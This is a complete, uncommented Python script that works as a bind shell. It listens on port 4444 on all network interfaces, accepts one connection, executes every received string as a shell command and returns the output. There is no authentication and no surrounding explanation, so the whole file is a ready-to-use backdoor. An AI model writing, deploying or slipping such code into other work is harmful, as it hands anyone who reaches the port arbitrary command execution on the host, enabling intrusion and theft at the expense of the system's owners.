import socket
import subprocess
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.bind(("0.0.0.0",4444))
s.listen(1)
print("listening")
conn,addr=s.accept()
print(addr)
while True:
    try:
        data=conn.recv(4096)
        if not data:
            break
        command=data.decode().strip()
        out=subprocess.check_output(command,shell=True)
        conn.sendall(out)
    except Exception as e:
        conn.sendall(str(e).encode())
conn.close()
s.close()
